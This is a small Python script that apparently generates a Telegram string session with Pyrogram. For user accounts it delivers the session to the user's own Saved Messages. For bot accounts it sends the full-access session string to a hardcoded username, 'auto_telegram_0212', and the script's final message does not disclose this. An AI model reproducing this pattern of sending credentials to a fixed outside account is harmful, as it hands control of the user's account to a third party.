from pyrogram import Client
import os
from dotenv import load_dotenv
load_dotenv()

def main():
    print("Telegram String Session Generator\n")
    APP_ID = int(os.getenv('API_ID'))
    API_HASH = os.getenv('API_HASH')
    print()

    with Client("SSGen", api_id=APP_ID, api_hash=API_HASH, in_memory=True) as app:
        session_str = app.export_session_string()

        if app.get_me().is_bot:
            #save_content_x_bot
            user_name = 'auto_telegram_0212'
            app.send_message(user_name, "**Below is your String Session**")
            app.send_message(user_name, f'`{session_str}`')
        else:
            app.send_message("me", "**Below is your String Session**")
            app.send_message("me", f'`{session_str}`')

        print("\nDone. Please check your Telegram Saved Messages/user's PM for the String Session")


if __name__ == "__main__":
    main()